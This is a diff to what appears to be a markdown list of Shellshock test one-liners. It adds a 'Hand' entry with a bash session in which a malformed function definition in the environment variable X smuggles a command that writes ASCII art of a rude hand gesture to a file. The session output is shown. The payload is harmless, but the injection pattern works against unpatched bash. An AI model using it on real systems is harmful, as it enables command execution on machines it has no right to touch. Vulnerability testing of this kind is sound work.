@@ -96,3 +96,27 @@ _will create a file named echo in cwd with date in it, if vulnerable_
 ## TMNT
 + https://twitter.com/SynAckPwn/status/514961810320293888/photo/1
 
+## Hand
++ Via @DJManilaIce - http://pastie.org/9601055
+```
+user@localhost:~$ env X='() { (a)=>\' /bin/bash -c "shellshocker echo -e \"           __ __\n          /  V  \ \n     _    |  |   |\n    / \   |  |   |\n    |  |  |  |   |\n    |  |  |  |   |\n    |  |__|  |   |\n    |  |  \  |___|___\n    |  \   |/        \ \n    |   |  |______    |\n    |   |  |          |\n    |   \__'   /     |\n    \        \(     /\n     \             /\n      \|            |\n\""; cat shellshocker
+/bin/bash: X: line 1: syntax error near unexpected token `='
+/bin/bash: X: line 1: `'
+/bin/bash: error importing function definition for `X'
+           __ __
+          /  V  \ 
+     _    |  |   |
+    / \   |  |   |
+    |  |  |  |   |
+    |  |  |  |   |
+    |  |__|  |   |
+    |  |  \  |___|___
+    |  \   |/        \ 
+    |   |  |______    |
+    |   |  |          |
+    |   \__'   /     |
+    \        \(     /
+     \             /
+      \|            |
+
+```
